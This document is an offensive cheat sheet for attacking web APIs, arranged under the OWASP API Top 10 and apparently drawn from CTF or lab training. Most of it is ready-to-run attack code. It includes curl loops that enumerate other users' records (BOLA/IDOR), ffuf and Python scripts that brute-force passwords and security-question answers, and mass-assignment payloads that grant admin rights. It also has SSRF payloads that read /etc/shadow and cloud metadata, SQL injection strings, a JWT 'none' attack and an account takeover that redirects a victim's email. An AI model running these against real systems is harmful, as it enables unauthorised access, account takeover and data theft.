# API Attacks

## OWASP API Security Top 10 (2023)

| Risk | Description |
|------|-------------|
| API1 | Broken Object Level Authorization (BOLA/IDOR) |
| API2 | Broken Authentication |
| API3 | Broken Object Property Level Authorization |
| API4 | Unrestricted Resource Consumption |
| API5 | Broken Function Level Authorization (BFLA) |
| API6 | Unrestricted Access to Sensitive Business Flows |
| API7 | Server Side Request Forgery (SSRF) |
| API8 | Security Misconfiguration (Injection) |
| API9 | Improper Inventory Management |
| API10 | Unsafe Consumption of APIs |

---

## API Recon & Enumeration

### Swagger/OpenAPI Discovery

```
/swagger
/swagger-ui
/swagger-ui.html
/api-docs
/v1/api-docs
/v2/api-docs
/openapi.json
```

### Common API Paths

```
/api/v1/
/api/v2/
/api/v0/   # legacy versions often unprotected
```

### Enumerate Your User Info

```bash
# Get current user info (look for companyID, userID, GUIDs)
curl -X GET 'http://TARGET/api/v1/users/current-user' \
  -H 'Authorization: Bearer JWT'

# Get current user roles - crucial for understanding access
curl -X GET 'http://TARGET/api/v1/roles/current-user' \
  -H 'Authorization: Bearer JWT'
```

### Enumerate All Users/Resources

```bash
# List all customers
curl -X GET 'http://TARGET/api/v1/customers' \
  -H 'Authorization: Bearer JWT' | jq

# List all suppliers  
curl -X GET 'http://TARGET/api/v1/suppliers' \
  -H 'Authorization: Bearer JWT' | jq
```

### Check API Versions (Improper Inventory)

* Look for Swagger dropdown "Select a definition" for multiple versions
* `/api/v0/` often has no auth and exposes deleted/legacy data

---

## BOLA / IDOR (API1)

* Broken Object Level Authorization - access other users' data by manipulating IDs
* CWE-639: Authorization Bypass Through User-Controlled Key

### Identification

* Look for endpoints with ID parameters: `/api/v1/resource/{ID}`
* Note the difference between integer IDs vs GUIDs
* Get YOUR ID first via `/current-user` endpoints, then try OTHER IDs
* If endpoint accepts integer ID but your ID is a GUID = potential IDOR

```bash
# Get your company ID
curl -X GET 'http://TARGET/api/v1/supplier-companies/current-user' \
  -H 'Authorization: Bearer JWT' | jq '.id'

# Try accessing other company's data with different ID
curl -X GET 'http://TARGET/api/v1/supplier-companies/yearly-reports/1' \
  -H 'Authorization: Bearer JWT' | jq
```

### Mass BOLA Abuse with Bash Loop

```bash
for ((i=1; i<=20; i++)); do
curl -s -w "\n" -X 'GET' \
  'http://TARGET/api/v1/resource/'$i'' \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer JWT_TOKEN' | jq
done
```

### ffuf IDOR Enumeration

```bash
ffuf -w ids.txt:ID -u http://TARGET/api/v1/users/ID -H "Authorization: Bearer JWT" -mc 200
```

### Bypassing Encoded/Hashed References

If IDs appear hashed (e.g., MD5):

```bash
# Check if it's base64 encoded UID then MD5 hashed
echo -n 1 | base64 -w 0 | md5sum
# cdd96d3cc73d1dbdaffa03cc6cd7339b

# Mass enumerate encoded IDs
for i in {1..10}; do
  hash=$(echo -n $i | base64 -w 0 | md5sum | tr -d ' -')
  curl -sOJ -X POST -d "contract=$hash" http://TARGET/download.php
done
```

Look in JavaScript source for hashing function:

```javascript
// Example: contract parameter is base64(uid) then MD5 hashed
function downloadContract(uid) {
    $.redirect("/download.php", {
        contract: CryptoJS.MD5(btoa(uid)).toString()
    }, "POST");
}
```

### IDOR via Information Disclosure Chain

1. GET other user's UUID via info disclosure
2. Use UUID to bypass access control on PUT/PATCH
3. Modify their details or escalate to admin

```bash
# Step 1: Get another user's details (info disclosure)
curl -X GET 'http://TARGET/api/v1/users/2' -H "Authorization: Bearer JWT"
# Response: {"uid":"2", "uuid":"4a9bd19b...", "role":"employee"}

# Step 2: Use their UUID to modify their profile
curl -X PUT 'http://TARGET/api/v1/users/2' \
  -H "Authorization: Bearer JWT" \
  -H "Content-Type: application/json" \
  -d '{"uid":"2", "uuid":"4a9bd19b...", "email":"attacker@evil.com"}'
```

---

## Broken Authentication (API2)

* CWE-307: Improper Restriction of Excessive Authentication Attempts

### Identification

* Test password policy by trying weak passwords (123456, password)
* Check error messages for info disclosure (min length, requirements)
* Look for rate limiting - try multiple failed logins rapidly
* Check for OTP/Security Question endpoints

```bash
# Test weak password on update endpoint
curl -X PATCH 'http://TARGET/api/v1/users/current-user' \
  -H 'Authorization: Bearer JWT' \
  -H 'Content-Type: application/json' \
  -d '{"password": "123456"}'
# If accepted = weak password policy
```

### Password Brute Force with ffuf

```bash
ffuf -w passwords.txt:PASS -w emails.txt:EMAIL \
  -u http://TARGET/api/v1/authentication/sign-in \
  -X POST -H "Content-Type: application/json" \
  -d '{"Email": "EMAIL", "Password": "PASS"}' \
  -fr "Invalid Credentials" -t 100
```

### Security Question Brute Force

```python
#!/usr/bin/python3
import requests

with open("wordlist.txt", "r") as fp:
    words = [x.strip() for x in fp.readlines()]

for word in words:
    headers = {"accept": "application/json", "Content-Type": "application/json"}
    data = {
        "Email": "target@example.com",
        "SecurityQuestionAnswer": word,
        "NewPassword": "newpass123456"
    }
    req = requests.post("http://TARGET/api/v1/passwords/reset", headers=headers, json=data)
    if "success" in req.text.lower():
        print(f"[+] Found: {word}")
        print(req.text)
        break
```

---

## Broken Object Property Level Authorization (API3)

* Excessive Data Exposure (CWE-213) - API returns fields you shouldn't see
* Mass Assignment (CWE-915) - Modify fields you shouldn't have access to

### Identification - Excessive Data Exposure

* Compare response fields to what a normal user should see
* Look for: email, phoneNumber, passwordHash, internalID, balance

```bash
# Get list of all users - check what fields are exposed
curl -X GET 'http://TARGET/api/v1/suppliers' \
  -H 'Authorization: Bearer JWT' | jq '.[0]'
# If you see email/phone of OTHER users = excessive data exposure
```

### Identification - Mass Assignment

* Look at PATCH/PUT endpoints - what fields can you update?
* Try adding extra fields that exist in GET responses

```bash
# Get your company info - note all fields
curl -X GET 'http://TARGET/api/v1/supplier-companies/current-user' \
  -H 'Authorization: Bearer JWT' | jq
# Look for fields like: isExemptedFromFee, isAdmin, role, balance
```

### Common Mass Assignment Fields

```json
{
  "isAdmin": true,
  "role": "admin",
  "isVerified": true,
  "isExemptedFromFee": 1,
  "balance": 99999,
  "discount": 100
}
```

### Test Mass Assignment

```bash
curl -X PATCH 'http://TARGET/api/v1/users/current' \
  -H 'Authorization: Bearer JWT' \
  -H 'Content-Type: application/json' \
  -d '{"name": "test", "isAdmin": true}'
```

---

## Unrestricted Resource Consumption (API4)

* CWE-400: Uncontrolled Resource Consumption

### Identification

* Look for file upload endpoints
* Test with large files - is there a size limit?
* Test with wrong file types - is there extension validation?
* Check where files are stored (wwwroot = publicly accessible)

```bash
# Upload and check response for file path
curl -X POST 'http://TARGET/api/v1/companies/certificates' \
  -H 'Authorization: Bearer JWT' \
  -F 'file=@test.pdf' \
  -F 'CompanyID=YOUR-GUID' | jq
# Look for: fileURI, path containing wwwroot
```

### Generate Large File for Upload DoS

```bash
# Create 30MB random file
dd if=/dev/urandom of=large_file.pdf bs=1M count=30

# Create fake executable
dd if=/dev/urandom of=malicious.exe bs=1M count=10
```

### Test File Upload Abuse

* No file size validation = storage exhaustion DoS
* No file type validation = malicious file upload
* Check if uploaded files are publicly accessible

```bash
# Download uploaded file from wwwroot
curl -O http://TARGET/uploads/malicious.exe
```

---

## BFLA (API5)

* CWE-200: Exposure of Sensitive Information to an Unauthorized Actor
* Access endpoints without required roles

### Identification

* Note the required role in Swagger docs for each endpoint
* Check YOUR roles with `/api/v1/roles/current-user`
* Try endpoints you DON'T have roles for

```bash
# Check your roles
curl -X GET 'http://TARGET/api/v1/roles/current-user' \
  -H 'Authorization: Bearer JWT' | jq
# Response: "User does not have any roles assigned"

# Try endpoint that requires ProductDiscounts_GetAll role anyway
curl -X GET 'http://TARGET/api/v1/products/discounts' \
  -H 'Authorization: Bearer JWT' | jq
# If you get data = BFLA vulnerability
```

### Test All Privileged Endpoints

```bash
# Even without roles, try privileged endpoints
curl -X GET 'http://TARGET/api/v1/admin/users' \
  -H 'Authorization: Bearer JWT'
```

---

## SSRF (API7)

* CWE-918: Server-Side Request Forgery

### Identification

* Look for fields containing URI/URL (fileURI, documentURL, imageURL)
* Check if you can PATCH/UPDATE these fields
* Look for fields using `file://` scheme in responses

```bash
# Get your profile - look for URI fields
curl -X GET 'http://TARGET/api/v1/suppliers/current-user' \
  -H 'Authorization: Bearer JWT' | jq
# Look for: certificateOfIncorporationPDFFileURI, professionalCVPDFFileURI

# Check if you can update URI fields
curl -X PATCH 'http://TARGET/api/v1/suppliers/current-user' \
  -H 'Authorization: Bearer JWT' \
  -H 'Content-Type: application/json' \
  -d '{"ProfessionalCVPDFFileURI": "file:///etc/passwd"}'
```

### File URI Scheme SSRF

```bash
# Update a field to point to local file
curl -X PATCH 'http://TARGET/api/v1/profile' \
  -H 'Authorization: Bearer JWT' \
  -H 'Content-Type: application/json' \
  -d '{"fileURI": "file:///etc/passwd"}'
```

### Common SSRF Payloads

```
file:///etc/passwd
file:///etc/shadow
file:///flag.txt
file:///proc/self/environ
http://127.0.0.1:80
http://localhost:8080/admin
http://169.254.169.254/latest/meta-data/  # AWS metadata
```

### Retrieve SSRF Results

```bash
# Get endpoint that reads the fileURI
curl -X GET 'http://TARGET/api/v1/profile/document' \
  -H 'Authorization: Bearer JWT'

# Decode base64 response
echo "BASE64_DATA" | base64 -d
```

---

## SQL Injection (API8)

* CWE-89: Improper Neutralization of Special Elements used in SQL Command

### Identification

* Look for search/filter endpoints with string parameters
* Endpoints like `/api/v1/products/{Name}/count`
* Test with trailing apostrophe `'`

```bash
# Normal request
curl -X GET 'http://TARGET/api/v1/products/laptop/count' \
  -H 'Authorization: Bearer JWT'
# Response: {"productsCount": 18}

# Test with apostrophe
curl -X GET "http://TARGET/api/v1/products/laptop'/count" \
  -H 'Authorization: Bearer JWT'
# Response: {"errorMessage": "An error has occurred!"} = SQLi likely

# Confirm with OR 1=1
curl -X GET "http://TARGET/api/v1/products/laptop'%20OR%201%3D1%20--/count" \
  -H 'Authorization: Bearer JWT'
# Response: {"productsCount": 720} = ALL records returned
```

### Test Payloads

### API SQLi Payloads

```
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
" OR "1"="1
admin'--
1 OR 1=1
1' ORDER BY 1--
1' UNION SELECT NULL--
```

---

## Improper Inventory Management (API9)

### Identification

* Check Swagger UI dropdown "Select a definition" for multiple versions
* Old versions often have NO authentication (no lock icons)
* May expose deleted/legacy data including password hashes

### Check for Old API Versions

```bash
# Try legacy version endpoints
curl -X GET 'http://TARGET/api/v0/customers/deleted' | jq
# No auth required = exposed deleted customer data with password hashes

curl -X GET 'http://TARGET/api/v0/supplier-companies/deleted' | jq
```

### Common Legacy Paths

```
/api/v0/
/api/v0/customers/deleted
/api/v0/supplier-companies/deleted
/api/v0/yearly-reports
/api/v0/quarterly-reports
```

---

## JWT Manipulation

### Decode JWT

```bash
# JWT structure: header.payload.signature
echo "HEADER_BASE64" | base64 -d
echo "PAYLOAD_BASE64" | base64 -d
```

### JWT None Algorithm Attack

```json
{"alg": "none", "typ": "JWT"}
```

### JWT Key Confusion

* RS256 → HS256 downgrade
* Use public key as HMAC secret

---

## Useful Tools

```bash
# Postman - API testing GUI
# Burp Suite - intercept/modify requests
# ffuf - fuzzing
# jq - JSON parsing
# CyberChef - encoding/decoding
```

### jq Examples

```bash
# Pretty print JSON
curl -s http://TARGET/api/v1/users | jq

# Extract specific field
curl -s http://TARGET/api/v1/users | jq '.[].email'

# Filter results
curl -s http://TARGET/api/v1/users | jq '.[] | select(.role=="admin")'
```

---

## Real Challenge Examples

### Security Question Brute Force (API2)

```python
#!/usr/bin/python3
import requests

with open("colors.txt", "r") as fp:
    colors = [x.strip() for x in fp.readlines()]

for i in colors:
    headers = {"accept": "application/json", "Content-Type": "application/json"}
    data = {
        "SupplierEmail": "B.Rogers1535@globalsolutions.com",
        "SecurityQuestionAnswer": i,
        "NewPassword": "admin123456"
    }
    req = requests.post(
        "http://TARGET/api/v2/authentication/suppliers/passwords/resets/security-question-answers",
        headers=headers,
        json=data
    )
    print(i)
    if "success" in req.text.lower():
        print(f"[+] FOUND: {i}")
        print(req.text)
        break
```

### SSRF via Profile URI Update (API7)

```bash
# Step 1: Update profile URI to point to local file
curl -X 'PATCH' \
  'http://TARGET/api/v2/suppliers/current-user' \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer JWT_TOKEN' \
  -H 'Content-Type: application/json' \
  -d '{
  "SecurityQuestion": "how many bananas",
  "SecurityQuestionAnswer": "3",
  "ProfessionalCVPDFFileURI": "file:///etc/passwd",
  "PhoneNumber": "1234567890",
  "Password": "admin123456"
}'

# Step 2: Confirm URI was updated
curl -X 'GET' \
  'http://TARGET/api/v2/suppliers/current-user' \
  -H 'Authorization: Bearer JWT_TOKEN' | jq '.supplier.professionalCVPDFFileURI'
# Should show: "file:///etc/passwd"

# Step 3: Read the flag
curl -X 'PATCH' \
  'http://TARGET/api/v2/suppliers/current-user' \
  -H 'Authorization: Bearer JWT_TOKEN' \
  -H 'Content-Type: application/json' \
  -d '{"ProfessionalCVPDFFileURI": "file:///flag.txt"}'

# Step 4: Retrieve file contents (base64 encoded)
curl -X 'GET' \
  'http://TARGET/api/v2/suppliers/ID/professional-cv' \
  -H 'Authorization: Bearer JWT_TOKEN' | jq '.base64Data'

# Step 5: Decode
echo "BASE64_DATA" | base64 -d
```

### BOLA Mass Enumeration (API1)

```bash
# Enumerate yearly reports for companies 1-20
for ((i=1; i<=20; i++)); do
curl -s -w "\n" -X 'GET' \
  'http://TARGET/api/v1/supplier-companies/yearly-reports/'$i'' \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer JWT_TOKEN' | jq
done
```
